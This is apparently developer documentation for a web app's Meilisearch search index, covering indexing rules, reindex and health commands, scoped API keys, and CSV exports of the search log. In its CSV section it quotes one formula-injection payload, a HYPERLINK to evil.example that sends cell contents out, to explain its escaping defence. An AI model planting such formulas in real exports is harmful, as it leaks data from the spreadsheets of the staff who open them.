# Search index

What may be put in the search index, how its Meilisearch settings are applied, how documents are rebuilt, and how the search page uses that index when Meilisearch is configured.

> **Status:** index rules, settings sync, reindex, the Meilisearch query path for `/search` and `/search/results`, a database fallback when Meilisearch is unreachable, a health check (in the ACP and as a command), and a CI job that runs the search tests against a real Meilisearch are in place. A queued rebuild and a zero-downtime index swap are not built yet.

## What is listed

`SEARCH_DRIVER=database` (the default) does not talk to Meilisearch. Scout stays on its null engine, so saving a record does not try to reach one, and the search page uses case-insensitive `LIKE` queries. `SEARCH_DRIVER=meilisearch` is the only value that indexes and searches Meilisearch. `MEILISEARCH_HOST` and `MEILISEARCH_KEY` are server-side. The key is one limited to what the app needs (see [Keys](#keys)), not the master key, and it is never sent to the browser.

Four indexes, and a record is in one only when a guest could already open it:

- **Blogs** (`blogs`). A published post, or a scheduled post whose time has arrived. A draft, an archived post, and a scheduled post that is still in the future stay out.
- **Forum threads** (`forum_threads`). A published thread, including the text of its visible replies. A thread that is not published stays out, and so does a reply that is held or deleted. Boards are public, so there is no permission to apply. A board that later requires one is excluded in `ForumThread::shouldBeSearchable()`.
- **FAQs** (`faqs`). A published question, with its category's name.
- **Products** (`products`). A product that is for sale. An archived product stays out. The shop uses the same rule. Products are not shown on the global search page yet.

Saving a record that stops qualifying removes its document. A new or edited reply asks for the thread's document again, once an engine is in use. Taking down a member's posts in bulk (see [moderation.md](moderation.md)) skips those model events, so the clean-up removes the unpublished threads from the index and rebuilds every other thread that lost a reply.

The words stored are plain text, and a document stops at 8,000 characters. Plain text means what a reader of the page gets: `Don't`, not `Don&#039;t` (a search for *don't* has to find it, and one for *039* must not), and the last word of a paragraph is not joined to the first of the next (`App\Support\Text\PlainText`). A document made before this was fixed has the old text until it is made again: `php artisan metaforger:search:reindex` ([Upgrading](upgrading.md#stored-text)).

## Searching

With `SEARCH_DRIVER=meilisearch`, `/search` (header JSON) and `/search/results` (Inertia page) read the blogs, forum threads and FAQs indexes through Scout. The response shape matches the database path (grouped items, per-group pagination, type filters, website-section gating, `<mark>` highlights). Forum reply text can match on Meilisearch because it is stored on the thread document; the database path still only matches title, excerpt and author.

With `SEARCH_DRIVER=database`, those endpoints keep using `LIKE` as before.

If Meilisearch cannot be reached while the driver is set to `meilisearch` (connection failure, or HTTP 404 / 408 / 502 / 503 / 504), `GlobalSearchService` logs one warning, opens a short circuit (`SEARCH_MEILISEARCH_CIRCUIT_SECONDS`, default 60), and serves the database path for that whole request. While the circuit is open, later searches skip Meilisearch entirely so the warning is not repeated every hit. Auth and misconfiguration errors (HTTP 401 / 403) and other unexpected failures still fail loudly. Artisan sync and reindex stay fail-loud; they do not fall back.

## Index settings

Settings live in code (`App\Support\Search\SearchIndexSettings`) and in `config/scout.php`, keyed by model class so the index name comes from each model's `searchableAs()` (including `SCOUT_PREFIX` when set). Each index lists its searchable attributes in ranking order, turns typo tolerance on, and leaves filterable and sortable attributes empty (visibility is decided when a document is written, not at query time).

With Meilisearch running and `SEARCH_DRIVER=meilisearch`, apply them:

```bash
php artisan metaforger:search:sync
```

That command only pushes settings. It does not import documents. With `SEARCH_DRIVER=database` it refuses and says so.

## Rebuilding documents

To flush each index and import every record that may be listed:

```bash
php artisan metaforger:search:reindex
```

Settings are applied first (same as sync). Pass `--skip-sync` to import only, or `--chunk=100` to change the batch size. Import runs in-process; a queued rebuild and a zero-downtime index swap are not built yet. With `SEARCH_DRIVER=database` the command refuses and says so.

**It waits, and says whether Meilisearch did it.** Meilisearch answers an update at once, does it afterwards, and may then refuse it (a document it cannot take, say). So the rebuild notes **where it began** (the number of the first Meilisearch task it will cause, before it sends anything), sends everything, waits until Meilisearch has finished the updates for these indexes, and counts as **done** only if none of them, from where it began, was refused:

- All accepted: it prints that Meilisearch finished and refused nothing, and records the time ("Documents last rebuilt" on the health card).
- Something refused: it fails (exit 1), says how many were refused and why the first was, and **does not record the rebuild as done**. The health card counts the refusals from the same point, so they stay in view until a rebuild that is accepted.
- Not finished within the time: it fails and says so (Meilisearch carries on; `metaforger:search:health` shows when it has, and whether it refused anything). The time is `SEARCH_REINDEX_WAIT` seconds (default 120); `--wait=300` gives a large index longer.
- `--wait=0` does not wait: it sends the rebuild and returns, and says the rebuild is **not recorded as done**, since it does not know. Where it began is still noted, so the health card shows what Meilisearch refuses of it.

Where the rebuild began is a task number and not a time, because the app's clock and Meilisearch's can differ and a time is only kept to the second: an update refused after the command finished is still the rebuild's, however long the command took.

To know all this the key has to be allowed to read tasks (`tasks.get`, see [Keys](#keys)). A key that cannot makes the rebuild stop before it sends anything and say so; `--wait=0` rebuilds without it.

A bulk import only loads rows that already qualify (published blogs and due scheduled posts, published threads, published FAQs, active products).

## Checking on it

**Admin → System settings** has a **Search** card, and `php artisan metaforger:search:health` says the same on the command line. They ask Meilisearch (waiting no longer than `SEARCH_HEALTH_TIMEOUT` seconds, default 3, for any answer) and report:

- whether it is **reachable**, which **version** it is, and when the settings were last pushed and the documents last rebuilt (noted by `metaforger:search:sync` and `metaforger:search:reindex`);
- for each index, **how many documents it holds against how many the database says it should** (counted the way a reindex would), and whether its **settings are the coded ones**. Anything else you changed on the server, such as stop words or synonyms, is left alone;
- how many **updates Meilisearch refused** since the last rebuild began (so the rebuild's own are among them, however long the command took), and why the first was;
- whether search is **on the database for a moment** after a failure (the circuit in [Searching](#searching)).

Each problem comes with the command that puts it right:

| It says | Run |
|---|---|
| No index exists yet, or a named one does not | `php artisan metaforger:search:reindex` |
| A count is off (a post saved while Meilisearch was down, or imported by a script) | `php artisan metaforger:search:reindex` |
| Settings are not the coded ones | `php artisan metaforger:search:sync` |
| It cannot be reached | Check `MEILISEARCH_HOST` and that Meilisearch is running. Search is on the database meanwhile. |
| It needs a key, or refused the key | Check `MEILISEARCH_KEY` and the [key's permissions](#keys). |

The page asks for the report **after it is shown** (a deferred prop), so a slow or silent host cannot hold up the settings; **Check again** asks once more. A Meilisearch that is still working through updates is noted and its count is not judged until it is done. With `SEARCH_DRIVER=database` the card says Meilisearch is not in use.

The command exits **0** when all is well (or nothing is in use) and **1** when something needs attention, so a deploy script can stop on it. `--json` prints the report as JSON with the same exit code. Nothing in the report ever contains the key, and the check only reads.

## Keys

Meilisearch answers a request with no key as `401`, and a key that is not valid, **or one that may not do what was asked**, as `403 invalid_api_key` in the same words, so the health check can only say "not valid, or may not do something the app needs".

The app indexes, sets settings, searches and reads statistics, so a key that only searches (such as Meilisearch's *Default Search API Key*) is not enough. Rather than the master key, make a key with these actions, which the live tests (below) check is all the app uses on Meilisearch 1.12:

```bash
curl -X POST "$MEILISEARCH_HOST/keys" \
  -H "Authorization: Bearer $MEILI_MASTER_KEY" \
  -H "Content-Type: application/json" \
  --data '{
    "name": "MetaForger",
    "description": "Search, index and settings for the app",
    "actions": ["search", "documents.add", "documents.delete", "indexes.create", "indexes.get", "indexes.delete", "settings.get", "settings.update", "tasks.get", "stats.get", "version"],
    "indexes": ["*"],
    "expiresAt": null
  }'
```

Put the `key` it answers with in `MEILISEARCH_KEY`. If the site uses `SCOUT_PREFIX`, `indexes` can be `["<prefix>*"]`. `tasks.get` is what lets a rebuild wait for Meilisearch and say whether it was accepted (without it the rebuild stops before it sends anything, unless it is run with `--wait=0`), and what lets the health card count refused updates. Without `version` only the card changes: it shows the version as unknown. Meilisearch's *Default Admin API Key* also works, but it can do everything, including manage keys.

## When Meilisearch is down

**Searching** keeps working: the page falls back to the database (see [Searching](#searching)).

**Saving** keeps working too, because with `SEARCH_DRIVER=meilisearch` Scout indexes a record **on the queue** (`SCOUT_QUEUE` is on unless it is set to `false`; with the database driver there is nothing to index, so it is off). The save returns at once and the job waits for Meilisearch; if it gives up, it ends in the failed jobs. This needs a queue worker running, the same one that sends email (`php artisan metaforger:queue work`, or `listen` while developing), and a record is in the index only once the worker has run its job. Without a worker the records are stored and the jobs wait, and the health card shows the documents that are missing. With `QUEUE_CONNECTION=sync` a job runs inside the request, which is the same as not queueing.

With **`SCOUT_QUEUE=false`** Scout indexes a record while the request that saved it is handled, so with Meilisearch down the post, FAQ, product or forum reply **is stored and then the request fails** with a connection error. That reaches a member posting a reply as much as an editor publishing a post. The health card notes it while indexing is not on the queue.

Either way, anything saved while Meilisearch was down is missing from the index afterwards. The health card shows the count that is off, and `php artisan metaforger:search:reindex` puts it right. The rebuild sends the documents itself, whatever `SCOUT_QUEUE` says: queued, it would be waiting for Meilisearch to finish what had not been sent, and would say the rebuild was done while the documents were still waiting for a worker.

## Deploying

- **Self-hosted:** `docker compose --profile search up -d meilisearch` runs the version this app is tested against (`getmeili/meilisearch:v1.12`, in `compose.yaml`). Set a master key of at least 16 bytes (`MEILI_MASTER_KEY`: Meilisearch will not start in production without one), make the key above, and keep the data volume. The index is a copy of what is in the database, so the simplest upgrade or recovery is to start with an empty Meilisearch and run `metaforger:search:sync` and then `metaforger:search:reindex`.
- **Meilisearch Cloud:** use the project's URL as `MEILISEARCH_HOST` and a key made as above (its *Default Admin API Key* works, with the caveat in [Keys](#keys)). Run `metaforger:search:sync` and `metaforger:search:reindex` once.
- Keep a queue worker running (`php artisan metaforger:queue work`, under Supervisor in production, see [The queue](redis.md#the-queue)): with Meilisearch, saving a record indexes it on the queue (see [When Meilisearch is down](#when-meilisearch-is-down)).
- Run `metaforger:search:health` in a deploy script, and `metaforger:search:reindex` again if it says a count is off.

## The search log and its two files

Every search made through `/search` that is at least `SEARCH_QUERY_MIN_LENGTH` characters long (two by default) is logged: what the visitor typed, trimmed and in lower case, cut at 255 characters, with how many results there were (`SEARCH_QUERY_RETENTION_DAYS` is how long a row stays, see [configuration.md](configuration.md)). A daily job adds the last `SEARCH_QUERY_AGGREGATION_WINDOW_DAYS` days up into one row for each term. Admin → Search analytics (`search.acp.view`) shows both and offers them as two CSV files: **every search** (term, results returned, when; newest first, narrowed by the term and the dates on the page) and **every term** (searches, searches with no result, the share that had a result, which the file and the page call *Click-Through Rate* although nothing counts clicks, average results, when it was last searched; the most searched first).

- **They are written as they are read, a thousand rows at a time.** A busy site logs hundreds of thousands of searches in the 90 days it keeps them, and the file used to be built from every row held in memory first: 158 MB at 100,000 searches, so past PHP's default limit the download ended in a fatal error. Now the log of searches takes the same memory at any size (4 MB at a million searches in an in-memory SQLite database, 21 seconds, one query for each thousand rows), and the list of terms a few bytes for each term (15 MB at 200,000 terms, against 39 MB for 20,000). The log is read from the newest row backwards, each page starting after the last row of the one before (by time and id); the terms are read as a list of ids in the order of the file, then by those ids, because the daily job rewrites their counts and a page that began at a count could miss or repeat a term. A term the job removes while the file is made is left out.
- **A cell that a spreadsheet would run is made text.** Anybody can search for anything, and the words are written into a file that staff open in Excel, LibreOffice or Sheets, which run a cell that starts with `=`, `+`, `-` or `@` (or a tab or carriage return) as a formula: `=HYPERLINK("https://evil.example/?"&A1,"click")` is a search like any other (CWE-1236). `App\Support\Csv\CsvCell::text()` puts an apostrophe in front of such a cell, which makes it text and which Excel does not show. A search that starts with `-` (`-5 degrees`) gets one too; anything else is written as it was typed. Use it for any CSV that is made from what somebody else typed: the summary column of `export.csv` in a member's data export goes through it too (their own comment, post or ticket subject, the name of one of their keys, and a moderator's reason, which somebody else wrote).
- **Quotes follow RFC 4180.** A quote inside a cell is doubled and there is no backslash escape (`fputcsv`'s default escape character writes `a\"b` with the quote *not* doubled, and a reader then ends the cell there and puts the rest in the next one; PHP 8.4 also deprecates leaving it at the default). Every line of every CSV the app makes is written by `App\Support\Csv\CsvRow::write()` (the two analytics files and `export.csv` in a member's data export, which used the default until then and wrote a comment with `\"` in it as a broken row), so there is one place where this is decided.
- **The daily job has to finish in a minute.** It runs at 00:30 on the queue, so it needs a worker (see [The queue](redis.md#the-queue)), and a worker stops a job after 60 seconds. The database adds the searches up in one `GROUP BY term` statement, a thousand terms are written to `search_query_aggregates` in one upsert, and one `DELETE ... WHERE NOT EXISTS` removes the terms nobody searched for in the window: 1.5 seconds at 63,000 terms on MariaDB, where it used to take 99, so that a site with more than about 37,000 different searches in a month would not have got to the end (an estimate; [performance.md](performance.md#pages-that-grow-with-the-data)).

## Not built

- A scheduled blog post is not added to the Meilisearch index by the clock: it is added when the post is saved after it is due, or when the index is rebuilt. The database search path still finds a due scheduled post without that save.
- Queued rebuild and zero-downtime index swap.
- A rebuild counts refusals from where it began up to a page of 100 (it says "100 or more" past that), and any refusal of an index since it began counts, including one for a post somebody saved while it ran.
- Telling anybody when the health check finds a problem (it shows on the System page and in the command; nothing is sent).
- Products on the global search page.

## Testing

`tests/Feature/Search/SearchIndexTest.php` uses Scout's collection engine: a draft, an unpublished thread, an unpublished FAQ, an archived product and a held reply are left out, unpublishing a post removes its document, and taking down a member's posts removes their threads and reply text from the index.

`tests/Feature/Search/SyncSearchIndexSettingsCommandTest.php` checks that sync refuses the database driver and pushes settings for every index when Meilisearch is configured (through a fake engine, without a live server).

`tests/Feature/Search/ReindexSearchCommandTest.php` checks that reindex refuses the database driver, flushes each index, imports only searchable rows, and can skip settings with `--skip-sync`. `ReindexSearchCommandTasksTest.php` checks what it does about Meilisearch's tasks, against a stand-in that answers as the real engine does: where it began is noted before it sends anything, it is done only when its updates were all accepted, a refusal fails it and is not recorded as done, a refusal that comes after the command has sent everything still fails it, refusals from before it are not its own, what it does when Meilisearch has not finished in time, with `--wait=0`, and with a key that cannot read tasks. `SearchTasksTest.php` checks the task code itself (including that Meilisearch's `total` ignores where a page starts, so what comes back is what is counted).

`tests/Feature/Search/GlobalSearchMeilisearchTest.php` runs the search page and header JSON with `SEARCH_DRIVER=meilisearch` backed by Scout's collection engine: cross-group results, unpublished exclusion, type filters, pagination, reply-text highlights and disabled website sections.

`tests/Feature/Search/SearchHealthTest.php` runs the health check through the real Meilisearch client and a stand-in that answers by path (`tests/Support/FakeMeilisearch.php`): a healthy engine, one that cannot be reached or stops answering, a missing key, a key that is refused, fresh installs and missing indexes, each way the settings can differ (and what Meilisearch adds that is not a difference), document counts that are off (singular and plural), an index still updating, refused updates and the time they are counted from, an open circuit, the record of the last sync and rebuild, and that no message ever carries the key. `SearchHealthCommandTest.php` covers the command (output, `--json`, exit codes), `SearchIndexStateTest.php` and `SearchIndexStateThatCannotBeKeptTest.php` the record of the last sync and rebuild (written only by a command that did its work, and never failing one), and `tests/Feature/Admin/SystemSearchHealthTest.php` the card on the System page (deferred, never holding the page up, no more permission than the page needs).

`tests/Live/Meilisearch/MeilisearchLiveTest.php` runs against a **real Meilisearch** and is what the CI `search (Meilisearch 1.12)` job runs: the settings Meilisearch ends up with, only what a guest can open being listed, a title ranking above a body, which typos are forgiven (and that a word under four letters forgives none), what leaves the index on unpublish and delete, a held reply never reaching a thread's document, the search page reading the index (with a typo only Meilisearch would forgive) and falling back to the database when it is unreachable, a save during an outage failing in the request and succeeding on the queue, the health check noticing a missing document, changed settings, no index, a wrong key and no key (and putting each right with the command), and a rebuild that Meilisearch refuses (an index whose primary key the documents do not have) failing, not being recorded as done, and the health check showing what it refused until a good rebuild; a key with only the actions listed in [Keys](#keys) doing everything the app does, while one without `settings.update` is refused and one without `tasks.get` cannot wait for a rebuild but can rebuild with `--wait=0`. These are in `tests/Live/Meilisearch`, which `php artisan test` does not run; they skip themselves unless `MEILISEARCH_LIVE_HOST` and `MEILISEARCH_LIVE_KEY` are set, and each run uses its own index prefix and removes its indexes. To run them locally:

```bash
docker compose --profile search up -d meilisearch
MEILISEARCH_LIVE_HOST=http://127.0.0.1:7700 MEILISEARCH_LIVE_KEY=<the master key> php artisan test tests/Live/Meilisearch
```

`tests/Unit/Search/MeilisearchCircuitBreakerTest.php` and `tests/Feature/Search/GlobalSearchMeilisearchFallbackTest.php` cover the open circuit, which failures trigger fallback, and a throwing Scout engine that still returns database-shaped results with a single warning.
